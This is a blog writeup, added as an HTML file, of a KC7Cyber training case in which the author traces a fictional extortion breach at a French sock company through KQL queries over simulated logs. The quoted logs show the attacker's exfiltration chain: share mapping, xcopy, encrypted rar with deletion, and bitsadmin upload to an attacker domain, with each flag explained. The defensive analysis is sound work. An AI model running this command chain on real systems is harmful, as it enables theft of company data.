@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - kc7cyber writeup - moderate - french socksess story</title>
+    <link rel = "stylesheet" href = "../../../css/variables.css">
+    <link rel = "stylesheet" href = "../../../css/style.css">
+    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
+  </head>
+  <body id="top">
+    <div class="sidebar">
+      <header><!--website header-->
+        <h1>shoutvoid</h1>
+        <p>Aspiring cybersecurity professional</p>
+      </header><!--website header-->
+      <nav class="site-nav"> <!--site-wide navigation-->
+        <a href="../../../index.html">About</a>
+        <a href="../../writeups.html">Writeups</a>
+      </nav> <!--site-wide navigation-->
+      <nav class="page-nav" id="page-navigation"> <!--page navigation sidebar-->
+        <ol class="page-toc"><!--page toc-->
+          <a class="skip" href="#page-main">Skip to main content</a>
+          <li><a href="#intro">Introduction</a></li><!--link to intro-->
+          <li><a href=#sections>Sections</a><!--all sections-->
+            <ol class="section-toc"><!--section-toc-->
+              <li class="section1-toc"><!--individual section toc-->
+                <a href=#section1>Section 1 - Sock Savior</a>
+              </li><!--individual section toc-->
+            </ol><!--section-toc-->
+          </li><!--all sections-->
+        </ol> <!--page-toc class-->
+      </nav> <!--page navigation sidebar-->
+      <footer><!--website footer-->
+        <p>Made with vanilla HTML + CSS by shoutvoid</p>
+        <address>
+          <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+          <a href="https://github.com/ShoutVoid">GitHub</a>
+          <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+          <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+        </address>
+      </footer><!--website footer-->
+    </div>
+    <main id="page-main"> <!--main page content-->
+      <article id="intro"> <!--introduction-->
+        <h1>French Socksess Story</h1>
+        <p>As is often the case, players take on the role of a rookie security analyst tasked with investigating a cyber attack against a company, this time a French fashion company specializing in socks, named Jus de Chaussette. While previous cases implied or outright stated you were an employee for those companies, this might be the first time you take on the role of an analyst interning at an specialized (unnamed) cybersecurity firm. I thought that was neat.</p>
+      </article> <!--introduction-->
+      <article id=sections><!--the game sections-->
+        <h2>Sections</h2>
+        <section id="section1"><!--section 1-->
+          <h3>Section 1 - Sock Savior</h3>
+          <p>There was a meeting with the Jus de Chaussette staff regarding an alleged data breach they've suffered. According to an executive, they were sent an email--projected during the meeting--by a threat actor calling itself "The Sock Puppet Empire", which might be a pun on both Jus de Chaussette's leading product and online sock puppet accounts; they threaten to leak controversial information (allegedly dishonest practices involving outsourced labor) found while snooping the company's intranet and emails, and demand 2M EUR within the next 24 hours in exchange for their silence in the matter. The email's information is truncated except for its subject line and body, replicated below:</p>
+          <pre>Pay up or the world will know your lies
+Bonjour,
+You, my dears, have been naughty. Lying is not a good look, non, non 😔
+
+What would your lovely customers think of that? Such cruel betrayal. Maybe we ought to warn them 🤔? Show them the proof we found while snooping around your systems 🕵🏻?
+
+Cover, you could buy our silence 🤫 For the very modest sum of 2,000,000€, your misbehaving will be our little secret, pinky swear.
+If we haven't heard from you in the next 24 hours, we'll introduce your Indian friends to your customers. We bet your shareholders will be delighted 💸.
+Tic tac, tic tac.
+
+Yours truly,
+
+The Sock Puppet Empire</pre>
+          <p>Knowing the subject line is a good starting point for the investigation.</p>
+          <pre><kbd>Email
+| where subject =~ 'Pay up or the world will know your lies'</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-30 23:44:13.0000</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>brooke_entoe@jusdechaussette.fr</td>
+                    <td>Pay up or the world will know your lies</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-30 23:44:13.0000</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>cho_cetkipu@jusdechaussette.fr</td>
+                    <td>Pay up or the world will know your lies</td>
+                    <td>CLEAN</td>
+                    <td> </td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-30 23:44:13.0000</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>theempireownsyou@proton.me</td>
+                    <td>cho_cetkipu@jusdechaussette.fr</td>
+                    <td>Pay up or the world will know your lies</td>
+                    <td>CLEAN</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Three emails, all sent at exactly the same time (twice to the same recipient). There are no outbound links or attachments according to the logs. The sender is <samp>theempireownsyou@proton.me</samp> and--following a quick <samp>lookup</samp> on the <samp>Employees</samp> table--the recipients are Cho Cetkipu (Chief Executive Officer) and Brooke Entoe (Chief Financial Officer). There are no other emails from this sender.</p>
+          <p>Since the threat actor outright admits to have stolen information--sensitive information regarding internal operations, particularly implying that the French-made socks aren't truly French--it wouldn't hurt to check if there are any suspicious processes in the CFO's and CEO's corporate devices.</p>
+          <pre><kbd>Email
+| where subject =~ 'Pay up or the world will know your lies'
+| distinct recipient
+| lookup Employees on $left.recipient == $right.email_addr
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp between (datetime(2024-08-30) .. datetime(2024-08-31))
+and process_commandline !contains "WindowsApps" //get rid of the chaff
+and process_commandline !contains "SystemApps" //get rid of the chaff
+and process_commandline !contains "Edge" //get rid of the chaff
+and process_commandline !contains "Teams" //get rid of the chaff
+| sort by hostname, timestamp asc</kbd></pre>
+          <details open id="results2">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 18:50:32.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net use Z: \\Server\Contracts\Hidden</td>
+                    <td>cmd.exe</td>
+                    <td>636f48ad6d49c4430b1b62d75440af1fa4be8a80ca671a0e09df80d2ff8169b9</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 19:12:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>xcopy /h /s /q Z: \\Server\Contracts\Hidden\* C:\Users\chcetkipu\Downloads\notfrench</td>
+                    <td>cmd.exe</td>
+                    <td>fe993e389b5a40faaa7d95cc49b94f561c45cc87708ad7b7fa236392c70563d8</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 20:02:54.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>rar a -df -hp sn3@ky C:\Users\chcetkipu\Downloads\lies.rar C:\Users\chcetkipu\Downloads\notfrench</td>
+                    <td>cmd.exe</td>
+                    <td>e5240df94a26cf644dfa76fe2375bdeaf5fdab6c86264ac432ddae764de19de3</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 20:51:45.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /create stomping</td>
+                    <td>cmd.exe</td>
+                    <td>8203b26256dc4b08ace6efce038be956abe493f3d8ebae164ab3ca8c6d77f76b</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 21:05:58.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /transfer stomping /upload https://liarliarsocksonfire.net/wegotthegoods/lies.rar C:\Users\chcetkipu\downloads\lies.rar</td>
+                    <td>cmd.exe</td>
+                    <td>5aa062c56adfe2c74e934dcd2eb008b75145279f2520223fd45b904052d403b0</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-30 21:37:32.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /complete stomping</td>
+                    <td>cmd.exe</td>
+                    <td>fe8f699de349c1c6a69e52f771fb1c80bc9741d9c2bafea70e680dab45815c42</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 18:50:58.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net use Z: \\\\Server\\Contracts\\Hidden</td>
+                    <td>cmd.exe</td>
+                    <td>ec9f8551c3fe2f1a8f5c244fd81a4ae877ed25c9fcc0cf5bb299241c9763e1e0</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 19:11:44.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>xcopy /h /s /q Z: \\\\Server\\Contracts\\Hidden\\* C:\\Users\\brentoe\\Downloads\\notfrench</td>
+                    <td>cmd.exe</td>
+                    <td>9956513bc59d6e3694635cc2699dcc99d181744e90e9bd782f01a516a4cb3884</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 19:44:10.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>rar a -df -hp sn3@ky C:\Users\brentoe\Downloads\lies.rar C:\Users\brentoe\Downloads\notfrench</td>
+                    <td>cmd.exe</td>
+                    <td>a0f4306ed63947c325a587c829502949b4c99deacbda7b059d8195bf85194861</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 20:06:18.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /create stomping</td>
+                    <td>cmd.exe</td>
+                    <td>e5218e2c06b998d67eda8bc6f76f547b0687b0eaf086ac24092472917931f915</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 20:48:48.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /transfer stomping /upload https://liarliarsocksonfire.net/wegotthegoods/lies.rar C:\Users\brentoe\downloads\lies.rar</td>
+                    <td>cmd.exe</td>
+                    <td>127958042e9c97b4367984d99fcfb9123d8ef4e4aab1b51e0b05f285967af406</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-30 21:06:56.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /complete stomping</td>
+                    <td>cmd.exe</td>
+                    <td>87a4a7883492915222e27633fca70ddcffbc039636e60c1272d711a84b5b59a5</td>
+                    <td>brentoe</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The first command they run is <samp>net use Z: \\Server\Contracts\Hidden</samp> in order to connect to the intranet's hidden contracts directory, assigning it the drive letter <samp>Z:</samp> [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/gg651155(v=ws.11)">Microsoft Learn</a>]. Then, they use <samp>xcopy</samp> to <i>recursively</i> copy all the contents of said directory to the <samp>notfrench</samp> directory, located in the target's <samp>Downloads</samp> directory; the flags used are:</p>
+          <ul>
+            <li><samp>/h</samp>: <quote>Copies files with hidden and system file attributes. By default, xcopy doesn't copy hidden or system files.</quote></li>
+            <li><samp>/s</samp>: <quote>Copies directories and subdirectories, unless they're empty. If you omit /s, xcopy works within a single directory.</quote></li>
+            <li><samp>/q</samp>: <quote>Suppresses the display of xcopy messages.</quote></li>
+          </ul>
+          <p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy">[Microsoft Learn]</a>. This is followed by the <samp>rar</samp> command with a specific set of switches: <samp>rar a -df -hp sn3@ky</samp>, meaning, in order:</p>
+          <ul>
+            <li><samp>a</samp>: a command, per <a href="https://documentation.help/WinRAR/HELPCmdA.htm">WinRAR's docs</a>, to add files to an archive.</li>
+            <li><samp>-df</samp>: a switch, per <a href="https://documentation.help/WinRAR/HELPSwDF.htm">WinRAR's docs</a>, to delete files after archiving.</li>
+            <li><samp>-hp</samp>: a switch, per <a href="https://documentation.help/WinRAR/HELPSwHP.htm">WinRAR's docs</a>, to encrypt both file data and headers. The password is <samp>sn3@ky</samp>.</li>
+          </ul>
+          <p>The resulting archive is <samp>lies.rar</samp>. Now, with their desired information packaged and ready to go, they use a command I hadn't seen used before: <samp>bitsadmin</samp>, which refers to Windows' built-in Background Intelligent Transfer Service (BITS). It can create, upload, download and monitor jobs  [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">Microsoft Learn</a>]. In order:</p>
+          <ol>
+            <li><samp>bitsadmin /create stomping</samp>: create a job called <samp>stomping</samp></li>
+            <li><samp>bitsadmin /transfer stomping /upload https://liarliarsocksonfire.net/wegotthegoods/lies.rar C:\Users\brentoe\downloads\lies.rar</samp>: <quote>Transfer one or more files.</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer">Microsoft Learn</a>]. The type of transfer is an upload i.e. exfiltrate the data to the threat actor's servers</li>
+            <li><samp>bitsadmin /complete stomping</samp>: set the job as complete, making all files available. [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-complete">Microsoft Learn</a>]</li>
+          </ol>
+          <p>To reveal more of the threat actor's infrastructure, I do a series of recursive <samp>lookup</samp>s against the <samp>PassiveDns</samp> table:</p>
+          <pre><kbd>PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain</kbd></pre>
+          <details open id="results3">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>domain</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>thesockwhisperer.com</td>
+                  </tr>
+                  <tr>
+                    <td>liarliarsocksonfire.net</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actor has two distinct domains; further recursive <samp>lookup</samp>s do not reveal any others. These domains, in turn, lead to these IP addresses:</p>
+          <pre><kbd>PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain
+| lookup PassiveDns on $left.domain == $right.domain
+| distinct ip</kbd></pre>
+          <details open id="results4">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>45.134.232.69</td>
+                  </tr>
+                  <tr>
+                    <td>193.233.125.78</td>
+                  </tr>
+                  <tr>
+                    <td>8.95.2.97</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actor has three distinct IP addresses; further recursive <samp>lookup</samp>s do not reveal any others.</p>
+          <p>Before checking if anyone else has strange processes on their devices, I wanted to take a look at any possible connections made by these IP addresses (or to these domains). I'll start with checking for any emails containing links to this domain:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain;
+let bad_ips =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain
+| lookup PassiveDns on $left.domain == $right.domain
+| distinct ip;
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)</kbd></pre>
+          <details open id="results5">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-19 14:37:05.0000</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>cho_cetkipu@jusdechaussette.fr</td>
+                    <td>Le President loves our latest design! Opportunity for presidential socks??? $$$$</td>
+                    <td>CLEAN</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 14:37:05.0000</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>cho_cetkipu@jusdechaussette.fr</td>
+                    <td>Le President loves our latest design! Opportunity for presidential socks??? $$$$</td>
+                    <td>CLEAN</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 14:37:05.0000</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>mike_oz@jusdechaussette.fr</td>
+                    <td>brooke_entoe@jusdechaussette.fr</td>
+                    <td>Le President loves our latest design! Opportunity for presidential socks??? $$$$</td>
+                    <td>CLEAN</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Quite worriesome; Customer Service Pinky Toe Mike Oz--as confirmed with a <samp>lookup</samp> on the <samp>Employees</samp> table--sent phishing emails with download links to malicious documents; the domain is related to the threat actor (see <a href="#results3">[3]</a> above). While there is always the possibility of an insider threat, it's just as likely (if not more so) that Mike Oz had his corporate account compromised. The affected users were CFO Brooke Entoe and CEO Cho Cetkipu.</p>
+          <p>Before examining Mike Oz further, I'll continue with the <samp>OutboundNetworkEvents</samp> table.</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain;
+let bad_ips =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain
+| lookup PassiveDns on $left.domain == $right.domain
+| distinct ip;
+OutboundNetworkEvents
+| where tostring(parse_url(url).Host) in (bad_domains)
+| lookup Employees on $left.src_ip == $right.ip_addr
+| distinct timestamp, method, src_ip, role, name, user_agent, url</kbd></pre>
+          <details open id="results6">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>src_ip</th>
+                    <th>role</th>
+                    <th>name</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-19 14:51:05.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.32</td>
+                    <td>CFO</td>
+                    <td>Brooke Entoe</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 15:09:05.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.2</td>
+                    <td>CEO</td>
+                    <td>Cho Cetkipu</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0)</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 15:10:05.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.2</td>
+                    <td>CEO</td>
+                    <td>Cho Cetkipu</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0)</td>
+                    <td>http://thesockwhisperer.com/images/modules/public/decision.docx</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>This unfortunately confirms that the CEO and CFO both clicked the link, and very likely downloaded the file and opened it. Before examining this further, I'd like to check on Mike Oz's device or emails for signs of threat actor activity; but before that, I want to check the <samp>InboundNetworkEvents</samp> table for any hints of recon the threat actors might've engaged in before this attack.</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain;
+let bad_ips =
+PassiveDns
+| where domain == "liarliarsocksonfire.net"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain
+| lookup PassiveDns on $left.domain == $right.domain
+| distinct ip;
+InboundNetworkEvents
+| where src_ip in (bad_ips)</kbd></pre>
+          <details open id="results7">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>src_ip</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                    <th>referrer</th>
+                    <th>status_code</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-18 00:00:00.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Ddoes%2Bthe%2BCEO%2Bwear%2Bhis%2Bown%2Bbrand%2Bof%2Bsocks</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:52:06.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dwho%2Bis%2Bthe%2Bgenius%2Bbehind%2Bthe%2Blatest%2Bdesign</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:52:27.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dhow%2Bto%2Bmake%2Ba%2Bcomplaint</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:52:53.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dhow%2Bto%2Bcontact%2Bcustomer%2Bservice</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:53:46.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dare%2Bthe%2Bsocks%2Breally%2Bthat%2Bcomfy</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:54:07.0000</td>
+                    <td>GET</td>
+                    <td>8.95.2.97</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/gallery/fashion-show/you-wont-believe-who-cried-wearing-our-brand-new-socks</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:55:04.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/blog/influencer-interviews/the-French-president-loves-us</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:55:44.0000</td>
+                    <td>GET</td>
+                    <td>8.95.2.97</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/about/our-awesome-team/mascot</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:56:09.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/about/our-awesome-team/customer-service-our-unsung-heroes</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:56:25.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/career/why-we-are-so-great-to-work-at</td>
+                    <td>https://www.welcometothejungle.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:56:49.0000</td>
+                    <td>GET</td>
+                    <td>8.95.2.97</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/career/join-us/baby-steps</td>
+                    <td>https://www.welcometothejungle.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:57:23.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/career/join-us/opportunities</td>
+                    <td>https://www.welcometothejungle.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:57:56.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/career/join-us/customer-service-role</td>
+                    <td>https://www.welcometothejungle.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:58:40.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dcustomer%2Bdatabase</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:59:15.0000</td>
+                    <td>GET</td>
